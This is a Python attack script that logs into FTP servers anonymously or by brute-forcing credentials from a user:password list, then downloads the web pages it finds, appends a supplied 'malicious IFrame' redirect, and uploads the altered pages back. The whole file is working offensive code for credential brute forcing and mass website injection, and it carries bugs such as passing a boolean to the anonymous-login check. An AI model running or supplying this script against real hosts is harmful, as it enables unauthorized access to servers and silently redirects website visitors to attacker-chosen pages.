import ftplib
import optparse
import time


def annonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print("\n[+]" + str(hostname ) + ' FTP LOGIN SUCESS !!')
        ftp.quit()
        return True
    except Exception as e:
        print("\n[+]" + str(hostname) + ' FTP Logon Failed')
        return False


def bruteLogin(hostname, passwdFile):
    pf = open(passwdFile, 'r')
    for line in pf.readlines():
        time.sleep(1)
        username = line.split(":")[0]
        password = line.split(":")[1].strip("\r").strip("\n")
        print("[+] Trying: " + username + "/" + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' +username+'/'+password)
            ftp.quit()
            return (username, password)
        except Exception as e:
            pass
    
    print ('\n[-] Could not brute force FTP credentials.')
    return (None, None)

def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return 
    retList = []
    for filename in dirList:
        fn = filename.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn or '.jsp' in fn:
            print('[+] Found default page: ' + filename)
        retList.append(filename)
    return retList


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)

def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defpages = returnDefault(ftp)
    for defpage in defpages:
        injectPage(ftp, defpage, redirect)


def main():
    parser = optparse.OptionParser('usage %prog' + '-H <target host[s]> -r <redirect page> -f <userpass file>')
    parser.add_option("-H", dest='tgtHosts', type="string", help="especify target host")
    parser.add_option("-f", dest="passwdFile", type="string", help="user:password format")
    parser.add_option("-r", dest="redirect",type="string" ,help="specify a redirect page")
    (options, args) = parser.parse_args()

    tgtHosts = str(options.tgtHosts).split(', ')
    passwdFile = options.passwdFile
    redirect = options.redirect

    if tgtHosts == None or redirect == None:
        print(parser.usage)
        exit(0)
    
    for tgtHost in tgtHosts:
        username = None
        password = None
        if annonLogin(tgtHost == True):
            username = 'anonymous'
            password = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            attack(username, password, tgtHost, redirect)
        elif passwdFile != None:
            (username, password) = bruteLogin(tgtHost, passwdFile)
        if password != None:
            print('[+] Using Creds: ' + username + '/' + password + ' to attack')
            attack(username, password, tgtHost, redirect)

if __name__ == '__main__':
    main()